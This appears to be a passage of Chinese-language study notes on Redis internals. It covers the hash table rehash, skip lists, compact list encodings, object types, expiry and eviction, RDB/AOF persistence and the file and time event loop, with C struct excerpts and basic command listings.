Redis的哈希表使用**链地址法**解决哈希冲突，每个哈希表节点上都有一个next指针，多个哈希表节点可以用next指针构成一个单向链表，被分配到同一个索引上的多个节点可以用这个单项链表连接起来。

程序总是将新节点添加到链表的表头为止（复杂度为O(1)），排在其他已有节点的前面。

#### 字典的rehash

当哈希表中键值对主键增多或者减少，为了让哈希表的负载因子维持在一个合理的范围内，当哈希表键值对数量太多或者太少，程序需要对哈希表的大小进行相应的扩展或者收缩，也就是rehash操作。

**rehash步骤：**

- 为字典的ht[1]哈希表分配空间，空间大小取决于要执行的操作以及ht[0]当前包含的键值对数量。
  - 扩展操作：ht[1]的大小为第一个大于等于`ht[0].used*2的2^n`（会考虑redis是否正在bgsave，但是如果过多也会强制扩容）
  - 收缩操作：ht[1]的大小为第一个大于等于`ht[0].used的2^n`（缩容条件：小于10%，不会考虑是否正在besave）
- 将保存在ht[0]中的所有键值对rehash到ht[1]上：rehash指重新计算键的哈希值和索引值，然后放置在ht[1]的指定位置上
- 当ht[0]中的键值对迁移完成之后，释放ht[0]，将ht[1]设置为ht[0]，并在ht[1]上创建一个空白哈希表。

**rehash操作不是一次性完成的，而是采用渐进方式**，这是为了避免一次性执行过多的rehash操作给服务器带来过大的负担。

**渐进式rehash步骤：**

- 为ht[1]分配空间，让字典同时持有ht[0]和ht[1]两个哈希表
- 在字典中维持一个索引计数器变量`rehashidx`，并将其设置为0，表示渐进式rehash开始
- 在rehash期间，每次对字典进行**添加、删除、查找或者更新操作**时，会顺带将ht[0]哈希表在rehashidx索引上的所有键值对rehash到ht[1]上，之后将该值加1
- 完成全部键值对rehash之后，程序将rehashidx属性值设置为-1，表示操作完成。

采用渐进式rehash会导致字典中的数据分散在两个dictht上，因此对字典的查找操作也需要到对应的dictht去执行。

添加操作之后保存到ht[1]中，可以保证ht[0]中的键值对只减不增。

### 跳跃列表

是有序集合的底层实现之一。是一种有序数据结构，通过在每个节点中维持多个指向其他节点的指针，从而达到快速访问节点的目的。

跳跃表支持平均O(logN)，最坏O(N)复杂度的节点查找，还可以通过顺序性操作来批量处理节点。

Redis中只有一个地方用到了跳跃表：**有序集合**。

跳跃表是基于多指针有序链表实现的，可以看成多个有序链表。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\jumptable.png" alt="img" style="zoom:60%;" />
</div>

Redis跳跃表由`redis.h/zskiplistNode和redis.h/zskiplist`两个结构定义，其中`zskiplistNode`结构用于表述跳跃表节点，`zskiplist`结构用于保存跳跃表节点的相关信息，比如节点的数量，以及指向表头结点和表尾节点的指针等等。

#### 跳跃表节点

```c++
typedef struct zskiplistNode{
	// 层
	struct zskiplistLevel{
		// 前进指针
		struct zskipListNode *forward;
		// 跨度，用于计算一个元素的排名
		unsigned int span;
	}level[];
	// 后退指针
	struct zskiplistNode *backward;
	// 分值
	double score;
	// 成员对象
	robj *obj;
}zskiplistNode;
```

- **层：**跳跃表节点的level数组可以包含多个元素，每个元素都包含一个指向其他节点的指针，程序可以通过这些层来加快访问其他节点的速度，一般来说，层的数量越多，访问其他节点的速度就越快。
  - 层数为每次创建一个新跳跃表节点时按照幂次定律（越大的数出现的概率越小）随机生成一个介于1和32之间的值。
- **前进指针**：每个层都有一个指向表尾方向的前进指针（level[i].forward），用于从表头向表尾方向访问节点。
- **跨度**：层的跨度用于记录两个节点之间的距离，两个节点之间的跨度越大，相距就越远；指向NULL的所有前进指针的跨度都为0，因为他们没有连向任何节点。
- **后退指针**：用于从表尾向表头访问节点，一次只能后退至前一个节点。
- **分值和成员**：分值是一个double浮点数，跳跃表中的所有节点按照分值从小到大排序；对象是一个指针，指向一个字符串对象，保存着一个SDS值。

#### 跳跃表结构

```c++
typedef struct zskiplist{
	// 表头节点和表尾节点
	struct zskiplistNode *header, *tail;
	// 表中节点的数量
	unsigned long length;
	// 表中层数最大的节点的层数
	int level;
}zskiplist;
```

- 头尾指针：通过这两个指针程序定位表头节点和表尾节点的复杂度为O(1)
- length：节点个数
- level：层数最大的节点的层数量，头节点层高不算在内。

在查找中，从上层指针开始查找，找到对应的区间之后再到下一层取查找。

与红黑树等平衡树相比，跳跃表具有以下优点：

- 插入速度非常快速，因为不需要进行旋转等操作维护树的平衡性
- 更容易实现
- 支持无锁操作

#### 查找过程

从当前的最高层开始，后继比待查关键字大，下移；比待查关键字小，右移。

#### 为什么不用红黑树

- 范围查找，跳表只要找到最小值之后，对第一层进行遍历就可以了；红黑树需要进行中序遍历
- 跳表的插入删除只需要修改相邻节点的指针；红黑树可能需要进行旋转操作
- 内存占用上来看，跳表要比红黑树更灵活一点。红黑树每个节点包含2个指针，跳表每个节点包含的指针数目可以调整，平均为1/(1-p)个，具体取决于参数p的大小，redis里默认p为1/4，也就是每个节点包含1.33个指针
- 实现简单

### 整数集合（IntSet）

是集合键的底层实现之一，当一个集合只包含整数值元素，并且这个集合的元素数量不多时，Redis就会使用整数集合作为集合键的底层实现。

数据结构：`intset.h/intset`

```
typedef struct intset{
	uint32_t encoding;		// 元素的编码方式
	uint32_t length;
	int8_t contents[];		// 保存元素的数据
}intset;
```

### 压缩列表（ziplist）

是列表键和哈希键的底层实现之一。当一个列表键只包含少量列表项，并且每个列表项要么就是小整数值，要么是长度比较短的字符串，那么redis就会使用压缩列表来做列表键的底层实现。

```c++
struct ziplist<T>{
	int32 zlbytes;		// 整个压缩列表字节数
	int32 zitail_offset;// 最后一个元素的偏移量
	int16 zllength;		// 元素个数
	T[] entries;		// 元素内容
	int8 zlend;			// 结束标志，恒为0xFF
};

struct entry{
    int<var> prevlen;	// 上一个entry的字节长度，如果长度小于254就用一个字节表示；如果超出就用5个字节表示
    int<var> encoding;	// 元素类型编码，通过前缀位识别具体存储的数据形式
    optional byte[] content;	// 元素内容
};
```

为了支持双向遍历，加入了最后一个元素的偏移量，同时在entry结构体中加入了上一个entry的字节长度。

增加元素时，因为ziplist都是紧凑存储，没有冗余空间意味着插入一个新元素都要调用realloc扩展内存。

### 紧凑链表（listpack）

对ziplist结构的改进，在存储空间上更加节省，结构上也比ziplist更精简。

```c++
struct listpack<T>{
	int32 total_bytes;	// 占用的总字节
	int16 size;			// 元素个数
	T[] entries;		// 紧凑排列的元素列表
	int8 end;			// 0xFF
};
struct lpentry{
    int<var> encoding;
    optional byte[] content;
    int<var> length;
};
```

因为在lpentry结构体的内部，length放置在了尾部，并且存储的是当前元素的长度，所以可以省去`altail_offset`来标记最后一个元素的位置，这个位置可以通过total_bytes字段和最后一个元素的长度字段计算出来。

### 快速列表（quicklist）

由于链表list的附加空间相对太高，prev和next指针就要占用16字节，另外每个节点的内存都是单独分配，会加剧内存的碎片化，影响内存管理效率。

quicklist是ziplist和linkedlist的结合体，他将linkedlist按段切分，每一段使用ziplist来紧凑存储，多个ziplist之间使用双向指针串接起来。

```c++
struct ziplist{

};
struct ziplist_compressed{
	int32 size;
	byte[] compressed_data;
};
struct quicklistNode{
	quicklistNode* prev;
	quicklistNode* next;
	ziplist* zl;		// 指向压缩链表
	int32 size;			// ziplist的字节总数
	int16 count;		// ziplist中的元素数量
	int2 encoding;		// 存储形式2bit，是按照原生字节数组还是LZF压缩存储
	...
};
struct quicklist{
	quicklistNode *head;
	quicklistNode *tail;
	long count;			// 元素总数
	int nodes;			// ziplist节点的个数
	int compressDepth;	// LZF算法压缩深度
    ...
};
```

quicklist内部默认单个ziplist长度位8K字节，超出这个字节数，就会新起一个ziplist。ziplist长度由参数`list-max-ziplist-size`决定。

quicklist默认压缩深度为0，也就是不压缩。为了支持快速的push/pop操作，quicklist的首尾两个ziplist不压缩，深度就是1。

### rax树

一种有序字典树（基数树Radix Tree），按照key的字典序配列，支持快速定位、插入和删除操作。

主要用在集群节点中用作内部数据结构。记录每个槽存储的键。

![image-20200813105440586](..\assets\post\others\rax.png)



## Redis 数据类型对象

Redis并没有直接使用上述数据结构来实现键值对数据库，而是基于这些数据结构创建了一个对象系统，这个系统包含字符串对象、列表对象、哈希对象、集合对象和有序集合对象这五种类型的对象。

Redis使用对象来表示数据库中的键和值，每次创建一个键值对时，至少会创建两个对象，**一个对象为键对象，一个为值对象**。

Redis每个对象都由一个`redisObject`结构表示，该结构中和保存数据有关的三个属性分别为`type,encoding,ptr`

```
typedef struct redisObject{
	unsigned type:4;		// 4 bits
	unsigned encoding:4;	// 4 bits
	unsigned lru:LRU_BITS;	// 24 bits
	int refcount;			// 4 bytes
	void *ptr;		// 指向底层实现数据结构的指针，占用8 bytes
}robj;
```

- 类型type：`REDIS_STRING, REDIS_LIST, REDIS_HASH, REDIS_SET, REDIS_ZSET`
- 编码encoding：记录了对象所使用的编码，也就是说这个对象使用了什么数据结构作为底层实现的。
  - 每种类型的对象都至少使用了两种不同的编码。
  - 使用命令`OBJECT ENCODING _key`可以获取键值的底层数据结构类型
- ptr指针指向对象的底层实现数据结构。

### 字符串对象

编码可以是`int, raw, embstr`。

- 如果字符串对象保存的是一个**整数值**，并且这个整数值可以用long类型表示，那么字符串对象会将整数值保存在字符串对象数据结构的ptr属性里面，并将字符串对象的编码设置为`int`。否则将其按照字符串格式存储。
- 如果保存的是一个字符串值，并且其长度大于44字节，那么使用SDS保存，并设置为`raw`
- 字符串值超度小于等于44字节，使用`embstr`方式保存。
- 可以用long double类型表示的**浮点数**在redis中也是作为字符串值来保存的。

![image-20200804153945342](..\assets\post\others\embstr+raw.png)

`embstr`存储方式是将`RedisObject`对象头和`SDS`对象连续存在一起，使用`malloc`方法一次性分配。

`raw`存储方式不存在一起，分两次分配空间，使用指针连接。

- 为什么是44字节作为分界点？

- Redis内存分配器`jemalloc/tcmalloc`等分配内存大小的单位都是2,4,8,16,32,64等，为了能容纳一个完整的`embstr`对象，`jemalloc`最少会分配32个字节的空间，如果字符再长一点，就是64字节的空间。如果更长就会按照raw方式分两次分配空间存储
- 当分配为64字节时，对象头占用16字节，SDS的len和free占用3字节，还有最后一个字符'\0'，所以最大为64-16-3-1=44字节。

### 列表对象

编码使用`quicklist`。

### 哈希对象

编码可以是`ziplist`或者`hashtable`。

`ziplist`编码的哈希对象使用压缩列表作为底层实现，每当有新的键值对要加入到哈希对象时，程序会先将保存了键的压缩列表节点推入到压缩列表表尾，然后再将保存了值的压缩列表节点推入到压缩列表表尾。

`hashtable`编码的哈希对象使用字典作为底层实现，哈希对象的每个键值对都是用一个字典键值来保存。

- 字典的每个键都是一个字符串对象，对象中保存了键值对的键
- 字典的每个值都是一个字符串对象，对象中保存了键值对的值

当哈希对象同时满足以下两个条件时，哈希对象使用ziplist，否则使用hashtable编码

- 哈希对象保存的所有键值对的键和值的字符串长度都小于64字节
- 哈希对象保存的键值对数量小于512个

### 集合对象

编码可以是`intset`或者`hashtable`。

`intset`编码的集合对象使用整数集合作为底层实现，集合对象包含的所有元素都被保存在整数集合里面。

`hashtable`编码的集合对象使用字典作为底层实现，字典的每个键都是一个字符串对象，每个字符串对象包含了一个集合元素，字典的值全被设为NULL。

当集合对象同时满足以下两个条件时，使用`intset`编码：

- 集合对象保存的所有元素都是整数值
- 元素数量不超过512个。

### 有序集合对象

有序集合对象的编码可以是`ziplist`或者`skiplist`。

`ziplist`编码的压缩列表对象使用压缩列表来作为底层实现，每个集合元素使用两个紧挨在一起的压缩列表节点来保存。第一个节点保存元素的成员（member），第二个节点保存元素的分值（score）。

- 压缩列表里的集合元素按分值从小到大进行排序，**分值较小的元素被放置在靠近表头的方向，分值大的放置在靠近表尾的方向。**

`skiplist`编码的有序集合对象使用`zset`结构作为底层实现，一个`zset`结构同时包含一个字典和一个跳跃表。

```
typedef struct zset{
	dict *dict;
	zskiplist *zsl;
}zset;
```

- `zsl`跳跃表按照分值从小到大保存了所有集合元素，每个跳跃表节点都保存了一个集合元素：跳跃表节点的object属性保存了元素的成员，跳跃表节点的score属性保存了元素的分值。通过跳跃表，可以对有序集合进行范围型操作。
- `dict`字典为有序集合创建一个成员到分值的映射，字典的每个键值都保存了一个集合元素：字典的键保存了元素的成员，字典的值保存元素的分值。通过字典，可以以O(1)复杂度查找给定成员的分值。
- **注意**：有序集合的每个元素成员都是一个字符串对象，每个元素的分值都是一个double类型的浮点数。
  - `zset`结构同时使用`zsl`和`dict`来保存有序集合元素，但是这两种数据结构都会通过指针来**共享相同元素的成员和分值**。
- 当有序集合对象同时满足以下两个条件的时候，对象使用`ziplist`编码：
  - 有序集合保存的元素数量小于128个
  - 所有元素成员的长度都小于64字节

## Redis 数据类型命令

| 数据类型 | 可以存储的值           | 操作                                                         |
| -------- | ---------------------- | ------------------------------------------------------------ |
| STRING   | 字符串、整数或者浮点数 | 对整个字符串或者字符串的其中一部分执行操作 对整数和浮点数执行自增或者自减操作 |
| LIST     | 列表                   | 从两端压入或者弹出元素 对单个或者多个元素进行修剪， 只保留一个范围内的元素 |
| SET      | 无序集合               | 添加、获取、移除单个元素 检查一个元素是否存在于集合中 计算交集、并集、差集 从集合里面随机获取元素 |
| HASH     | 包含键值对的无序散列表 | 添加、获取、移除单个键值对 获取所有键值对 检查某个键是否存在 |
| ZSET     | 有序集合               | 添加、获取、删除元素 根据分值范围或者成员来获取元素 计算一个键的排名 |

### String：字符串

```bash
APPEND	_key _string	# 向key的value后追加字符串，如果不存在相当于set key
STRLEN	_key			# 获取key的长度
INCR	_key			# key的value自加1
DECR	_key			# key的value自减1
INCR	_key	_num	# key的value自加num
DECR	_key	_num	# key的value自减num

GETRANGE_key start end	# 截取[start,end]范围的字符串，-1表示最后一个
SETRANGE_key offset string	# 替换从offset开始的之后的字符串

SETEX	_key _time _string	# 设置带有过期时间的key
SETNX	_key _string		# 不存在时设置

MSET	_key _value _key _value	# 批量设置key
MGET	_key _key			# 批量获取key
MSETNX	_key _value			# 批量设置不存在的，原子性操作，要么全部成功，要么一起失败
```

### List：列表（可以重复）

```
RPUSH 	_list _item		# 从list右边插入value，如果没有list就创建
LPUSH	_list _item		# 从左边插入
RPOP	_list			# 从右边删除一个
LPOP	_list			# 从左边删除一个
LRANGE	_list start end	# 获取list中范围value
LINDEX	_list _index		# 获取指定位置的value
```

### SET：集合（不可重复，无序）

集合是通过哈希表实现的。集合中最大的成员数为2^32-1（即每个集合可存储40多亿个成员）

```
SADD	_set _item		# 集合中插入一个value，如果没有就创建
SMEMBERS_set			# 获取集合所有value
SISMEMBER _set _item	# 查看item是否在集合中
SREM	_set _item		# 移除元素
```

### Hash：哈希表

```bash
HSET	_hash _key _value	# 在_hash表中设置_key和_value
HGETALL	_hash				# 获取_hash表中所有键值对
HDEL	_hash _key			# 删除_hash表中指定键
HGET	_hash _key			# 获取指定键
```

### ZSET：有序集合

每个元素都会关联一个double类型的分数，redis时通过分数为集合中的成员从小到大进行排序的。

有序集合成员是唯一的，但是分数是可以重复的。

```
ZADD	_zset _score _mem	# 向zset有序集合中添加成员
ZRANGE	_zset start end WITHSCORES	# 获取范围内成员，WITHSCORES参数表示同时获取分数
ZRANGEBYSCORES	_zset start end WITHSCORES	# 根据分数范围获取
ZREM	_zset _mem			# 移除成员
```

## Redis数据库设计原理

Redis服务器将所有的数据库保存在服务器状态`redis.h/redisServer`的db数组中，db数组的每个项都是一个`redis.h/redisDb`，每个redisDb结构代表一个数据库。

Redis中数据库的数量会根据dbnum的值进行创建，默认情况下dbnum值为16.

```c
typedef struct redisDb {
    dict *dict;
    dict *expires;
    int id;
} redisDb;
```

### 数据库键空间

Redis是一个键值对（key-value pair）数据库服务器，服务器中的每个数据库都有一个`redis.h/redisDb`结构表示，其中redisDb结构中的dict字典保存了数据库中的所有键值对，这个字典称为键空间（key space）

- 键空间的键也就是数据库的键，每个键都是一个字符串对象
- 键空间的值也就是数据库的值，每个值可以是字符串对象、列表对象、哈希表对象、集合对象和有序集合对象中的任意一种redis对象。

因为数据库的键空间是一个字典，所有所有针对数据库的操作（添加，删除，更新，取值），实际上都是通过对键空间字典进行操作来实现的。

### 数据库过期删除

redisDb结构的expires字典保存了数据库中所有键的过期时间，这个字典称为过期字典。

- 过期字典的键是一个指针，这个指针指向键空间中的某个键对象（也就是某个数据库键）
- 过期字典的值是一个long long类型的整数，这个整数保存了键所指向的数据库键的过期时间--一个毫秒精度的UNIX时间戳。

**如果的大量的key过期时间设置的过于集中，到过期的时间点，redis可能会出现短暂的卡顿现象。一般需要在过期时间上加一个随机值，使得过期时间分散一些**

#### 过期删除策略

- 定时删除（不使用）：设置键的过期时间的同时，创建一个定时器（timer），让定时器在键的过期时间来临时，立即执行对键的删除操作。
  - 优点：对于内存是最友好的，通过使用定时器，定时删除策略可以保证过期键尽快删除，并释放内存空间
  - 缺点：对于CPU不友好，在过期键比较多的情况下，删除过期键会占用相当一部分的CPU时间。
  - 其次，创建一个定时器需要用到Redis的时间事件，而时间事件的实现方式无序链表，查找一个事件的时间复杂度为O(N)，会导致不能高效的处理大量时间事件。
- **惰性删除**：放任键过期不管，但是每次从键空间来获取键时，先检查该键是否过期，如果过期就删除，否则就返回
  - 使用`redis.c/expireIfNeeded`函数实现，如果输入键未设置过期时间或者设置过期时间但未过期，不做动作；否则删除键。
  - 优点：对CPU友好，删除的目标仅限于当前处理的键，不会在删除其他无关的过期键上花费任何CPU时间
  - 缺点：对内存不友好，可能会存在大量不使用的键，可以将这种情况看成一种内存泄漏
- **定期删除**：每隔一段时间，程序对数据库进行检查，删除过期键
  - 使用`redis.c/activeExpireCycle`函数实现，分多次遍历每个数据库，从数据库中的expires字典中**随机检查**一部分键的过期时间，并删除其中的过期键。其中`current_db`记录了最后被检查的数据库，下次定期删除的时候从该数据库开始遍历。
  - 通过限制删除操作执行的时长和频率来减少操作对CPU时间的影响
  - 通过定其删除过期键有效的减少了因为过期键带来的内存浪费
  - 但是确定删除操作执行的时长和频率是一个难点。

#### 过期删除对持久化和复制的影响

- RDB持久化
  - 写入RDB文件不会产生影响，因为写入该文件时会首先检查是否过期
  - 载入RDB文件，服务器为主服务器模式时过期键会被忽略，从服务器模式时无论键是否过期都会被载入到数据库中。
- AOF持久化
  - 写入AOF文件，当过期键被惰性删除或者定期删除之后，程序会向AOF文件后追加一条DEL命令，显式记录该键已被删除。
  - 重写AOF文件，已过期的键不会被保存到重写后的AOF文件
- 复制
  - 当服务器运行在复制模式下时，从服务器的过期键删除动作由主服务器控制；
    - 主服务器在删除一个过期键之后，会**显式**的向所有服务器发送一个DEL命令，告知从服务器删除这个过期键
    - 从服务器在执行完客户端发送的读命令后，即使碰到过期键也不会删除，而是继续像处理未过期的键一样来处理过期键
    - 从服务器只有接到主服务器发来的DEL命令之后才会删除过期键。

### 数据库通知

该功能可以让客户端通过订阅给定的频道或者模式，来获知数据库中键的变化，以及数据库中命令的执行情况。

`notify-keyspace-events`选项决定了服务器所发送通知的类型：

- `AKE`：发送所有类型的键空间通知和键空间事件通知
- `AK`：发送所有类型的键空间通知
- `AE`：发送所有类型的键事件通知
- `K$`：只发送和字符串键有关的键空间通知
- `El`：只发送和列表键有关的键事件通知

#### 发送通知

该功能由`void notifyKeyspaceEvent(int type, char *event, robj *key, int dbid)`函数实现

## Redis使用场景

### 计数器

可以对string进行自增自减运算，从而实现计数器的功能。

Redis这种内存型数据库的读写性能非常高，很适合存储频繁读写的计数量。

### 缓存

将热点数据放在内存中，设置内存的最大使用量以及淘汰缓存策略来保证缓存的命中率。

### 查找表

查找表和缓存类似，也是利用了redis快速的查找特性。但是查找表的内容不能失效，而缓存的内容可以失效，因为缓存不作为可靠的数据来源。

例如DNS记录就很适合使用redis进行存储。

### 消息队列

List是一个双向链表，可以通过LPUSH和RPOP写入和读取信息。

不过最好使用rebbitmq等消息中间件。

### 会话缓存

可以使用redis来统一存储多台应用服务器的会话信息。

当应用服务器不再存储用户的会话信息，也就不再具有状态，一个用户可以请求任意一个应用服务器，从而更容易实现高可用性以及可伸缩性。

### 分布式锁实现

在分布式场景下，无法使用单机环境的锁来对多个节点上的进程进行同步。

可以使用redis自带的SETNX命令实现分布式锁，除此之外，还可以使用官方提供的redlock分布式锁来实现。

### 其他

Set可以实现交集、并集等操作，从而实现共同好友等功能。

ZSet可以实现有序性操作，从而实现排行榜等功能。

## 数据淘汰策略-内存满

可以设置内存最大使用量，当内存使用量超出时，会实行数据淘汰策略。

Redis中有6中淘汰策略：

| 策略            | 描述                                                 |
| --------------- | ---------------------------------------------------- |
| volatile-lru    | 从已设置过期时间的数据集中挑选最近最少使用的数据淘汰 |
| volatile-ttl    | 从已设置过期时间的数据集中挑选将要过期的数据淘汰     |
| volatile-random | 从已设置过期时间的数据集中任意选择数据淘汰           |
| allkeys-lru     | 从所有数据集中挑选最近最少使用的数据淘汰             |
| allkeys-random  | 从所有数据集中任意选择数据进行淘汰                   |
| noeviction      | 禁止驱逐数据                                         |

作为内存数据库，处于对性能和内存消耗的考虑，redis的淘汰算法实际实现上并非针对所有key，而是抽样一部分并且选出被淘汰的key。

使用redis缓存数据时，为了提高缓存命中率，需要保证缓存数据都是热点数据，可以将内存最大使用量设置为热点数据占用的内存量，然后使用`allkeys-lru`淘汰策略，将最近最少使用的数据淘汰。

## Redis持久化

Redis是内存型数据库，为了保证数据在断电后不会丢失，需要将内存中的数据持久化到硬盘上。

通常将服务器中的非空数据库以及他们的键值对统称为数据库状态。

**bgsave做镜像全量持久化，aof做增量持久化。因为bgsave会耗费较长时间，不够实时，在停机的时候会导致大量丢失数据，所以需要aof来配合使用。在redis实例重启时，会使用bgsave持久化文件重新构建内存，再使用aof重放近期的操作指令来实现完整恢复重启之前的状态。**

**对方追问那如果突然机器掉电会怎样？取决于aof日志sync属性的配置，如果不要求性能，在每条写指令时都sync一下磁盘，就不会丢失数据。但是在高性能的要求下每次都sync是不现实的，一般都使用定时sync，比如1s1次，这个时候最多就会丢失1s的数据。**

**对方追问bgsave的原理是什么？你给出两个词汇就可以了，fork和cow。fork是指redis通过创建子进程来进行bgsave操作，cow指的是copy on write，子进程创建后，父子进程共享数据段，父进程继续提供读写服务，写脏的页面数据会逐渐和子进程分离开来。**

### RDB持久化

将某个时间点的所有数据（RDB文件）都存放在硬盘上。

可以将快照复制到其他服务器从而创建具有相同数据的服务器副本。

如果系统发生故障，将会丢失最后一次创建快照之后的数据。

如果数据量很大，保存快照的时间很长。

#### RDB使用命令

- SAVE命令：阻塞Redis服务器进程，直到RDB文件创建完毕为止，在服务器进程阻塞期间，服务器不处理任何命令请求。
- **BGSAVE命令**：派生一个子进程，由子进程负责创建RDB文件。`BGSAVE`和`SAVE、BGSAVE、BGREWRITEAOF`命令冲突。

#### RDB文件结构

一个完整的RDB文件包含五部分：`REDIS, db_version, databases, EOF, check_sum`

- `REDIS`：RDB文件标识，存储的是REDIS五个字符
- `db_version`：长度4个字节，一个字符串表示的整数，记录了RDB文件的版本号
- `databases`：包含零个或者任意多个数据库，以及各个数据库中的键值对数据
  - 如果服务器的数据库状态为空，那么这个部分也为空，长度为0字节
  - 如果数据库状态为非空，那么这个部分也为非空
- `EOF`：长度为1个字节，标志RDB文件正文内容结束
- `check_sum`：8字节长度的无符号整数

### AOF持久化

将写命令添加到AOF文件的末尾。（Append Only File），是通过保存Redis服务器所执行的写命令来记录数据库状态的。

使用AOF持久化需要设置同步选项，从而确保写命令同步到磁盘文件上的时机。这时因为对文件进行写入并不会马上将内容同步到磁盘上，而是先存储到缓冲区，然后由操作系统决定什么时候同步到磁盘。

| 选项     | 同步频率                 |
| -------- | ------------------------ |
| always   | 每个写命令都同步         |
| everysec | 每秒同步一次             |
| no       | 让操作系统来决定何时同步 |

- always 选项会严重减低服务器的性能；
- everysec 选项比较合适，可以保证系统崩溃时只会丢失一秒左右的数据，并且 **Redis 每秒执行一次同步对服务器性能几乎没有任何影响；**
- no 选项并不能给服务器性能带来多大的提升，而且也会增加系统崩溃时数据丢失的数量。

随着服务器写请求的增多，AOF 文件会越来越大。Redis 提供了一种将 AOF 重写的特性，能够去除 AOF 文件中的冗余写命令。

#### AOF持久化的实现

AOF持久化的实现可以分为**命令追加（append），文件写入（写入内存缓冲区），文件同步（sync，写入真实文件）**三个步骤。

- 命令追加：服务器在执行完一个写命令之后，会以协议格式将被执行的写命令追加到服务器状态的`aof_buf`缓存区的末尾。
- 文件写入：服务器在处理文件事件时可能会执行写命令，使得一些内容被追加到`aof_buf`缓冲区中，所以在服务器每次结束一个事件循环之前，都会调用`flushAppendOnlyFile`函数，考虑是否将缓冲区内容写入和保存到AOF文件里面。
  - `flushAppendOnlyFile`函数的行为可以通过配置`appendfsync`选项的值来决定，
    - 当为`always`时将缓冲区的内容写入并同步到AOF文件中，最安全的，但是效率最慢；
    - `everysec`将缓冲区内容写入到AOF文件中，如果上次同步AOF时间为一秒前，就对AOF文件进行同步，如果出现故障只会丢失1s内的数据，效率适当；
    - `no`将`aof_buf`缓冲区内容写入到AOF文件，但是并不对其进行同步，何时同步由操作系统决定，安全性最低，效率和everysec差不多。

#### AOF文件的载入与数据还原

- 创建一个没有网络连接的伪客户端
- 从AOF文件中分析并读取写命令，并使用伪客户端执行该命令

#### AOF重写

可以使原本包含很多冗余命令的AOF文件减小很多，所以文件大小也会小很多，最后数据还原的结果是相同的。

- 原理：首先从数据库中读取键现在的值，然后用一条命令区记录键值对，代替之前记录这个键值对的多条命令。

## Redis事件

Redis服务器是一个事件驱动程序。

### 文件事件

服务器通过套接字和客户端（或者其他服务器）进行通信，文件事件就是对套接字操作的抽象。

Redis通过Reactor模式开发了自己的**网络事件处理器**，被称为文件事件处理器。

- 使用I/O多路复用程序同时监听多个套接字，并将到达的事件传送给文件事件分派器，分派器会根据套接字产生的事件类型调用响应的事件处理器。
- 当被监听的套接字准备好执行连接应答（accept），读取（read），写入（write），关闭（close）等操作时，与操作相对应的文件事件就会产生，这时文件事件处理器就会调用套接字之前关联好的事件处理器来处理这些事件。

![img](..\assets\post\others\fileevent.png)

- 尽管多个文件事件可能会并发的出现，但是IO多路复用程序总是将所有产生事件的套接字都放在一个队列里面，然后通过这个队列，以有序、同步、每次一个套接字的方式向文件事件分派器传送套接字。

#### 文件事件的I/O多路复用

Redis的IO多路复用程序的所有功能都是通过包装常用的`select,epoll,evport和kqueue`这些IO多路复用函数库来实现的。

Redis在IO多路复用程序的实现源码中用`#include`宏定义了相应的规则，程序会在编译的时候自动选择系统中性能最高的IO多路复用函数库来作为redis的IO多路复用的底层实现。

#### 文件事件的类型

IO多路复用程序可以监听多个套接字的`ae.h/AE_READABLE, ae.h/AR_WRITABLE`事件，分别对应：

- 当套接字可读时（客户端产生write操作，或者执行close操作），或者有新的可应答（acceptable）套接字出现时（客户端产生connect操作），套接字产生`AE_READABLE`事件。
- 当套接字可写时（客户端执行read操作），套接字产生`AE_WRITABLE`事件。

当一个套接字同时可读可写时，服务器优先处理读，再处理写。

#### 文件事件API

`ae.c/aeCreateFileEvent`函数接受一个套接字描述符，一个事件类型，一个事件处理器作为参数。

#### 文件事件的处理器

- **连接应答处理器**：`networking.c/acceptTcpHandler`，用于对服务器监听套接字的客户端进行应答，具体实现为`sys/socket.h/accept`函数的封装。
  - Redis服务器进行**初始化**的时候，服务器会将这个处理器和`AE_READABLE`事件关联起来，当客户端使用`sys/scoket.h/connect`函数连接服务器监听套接字的时候，套接字就会产生`AE_READABLE`事件，引发连接应答处理器执行
- **命令请求处理器**：`networking,c/readQueryFromClient`，负责从套接字中读入客户端发送的命令请求内容，具体实现为`unistd.h/read`函数的包装。
  - 当有客户端连接到服务器之后，服务器会将这个处理器和`AE_READABLE`事件关联起来，当客户端向服务器发送命令请求时，会产生`AE_READABLE`事件，引发命令请求处理器执行。
  - 在客户端连接服务端的整个过程中，服务器会一直为客户端套接字的`AE_READABLE`关联命令请求处理器
- **命令回复处理器**：`networking.c/sendReplyToClient`，负责将服务器执行命令后得到的命令恢复通过套接字返回给客户端，具体实现为`unistd.h/write`函数的包装
  - 当服务器有命令回复需要传送给客户端的时候，服务器会将客户端套接字的`AE_WRITABLE`事件和命令回复处理器关联起来，当客户端准备好接收命令回复时，会产生该事件，引发命令回复处理器执行。
  - 当发送完毕后，服务器自动解除相应的关联。

### 时间事件

服务器有一些操作需要在给定的时间点执行，时间事件是对这类定时操作的抽象。

时间事件又分为：

- 定时事件：是让一段程序在指定的时间之内执行一次，执行完成之后从链表中删除该事件
- 周期性事件：是让一段程序没隔指定事件就执行一次，执行完成之后更新时间事件的when属性

时间事件主要由以下三个属性组成：

- `id`：服务器为事件事件创建的全局唯一ID（标识号），ID按照从小打到的顺序递增，新事件的ID号总是大于旧事件的。
- `when`：毫秒精度的UNIX时间戳，记录了时间事件的到达时间。
- `timeproc`：时间事件处理器，一个函数。

一个时间事件是定时事件还是周期性事件取决于时间事件处理器的返回值。

- 返回`ae.h/AE_NOMORE`，该事件为定时事件：该事件到达一次就会被删除，之后不会到达。
- 返回非NOMORE的整数值，那么这个事件为定期事件：当一个时间事件到达之后，服务器会根据事件处理器返回的值，对时间事件的when属性进行更新，让这个事件再次到达。

#### 时间事件实现

Redis将所有时间事件都放在一个无序链表（无序链表不是不按ID排序，而是说该链表不按when属性的大小排序）中。

通过遍历这个链表查找已经到达的时间事件，并调用相应的事件处理器。

因为链表没有按照when属性进行排序，所以需要遍历链表中的所有时间事件，这样才能确保服务器中所有已到达的时间事件都会被处理。

#### 时间事件API

`ae.c/aeCreateTimeEvent`函数接受一个milliseconds和一个时间事件处理器proc作为参数，将一个新的时间时间添加到服务器。

`ae.c/aeDeleteTimeEvent`函数接受一个时间事件ID作为参数，然后从服务器中删除该ID对应的时间事件。

`ae.c/aeSearchNearestTimer`函数返回到达事件距离当前事件最近的那个时间事件

`ae.c/processTimeEvents`函数是时间事件的执行器，这个函数遍历所有已经到达的时间事件，并调用这些事件的处理器。

### 事件的调度与执行

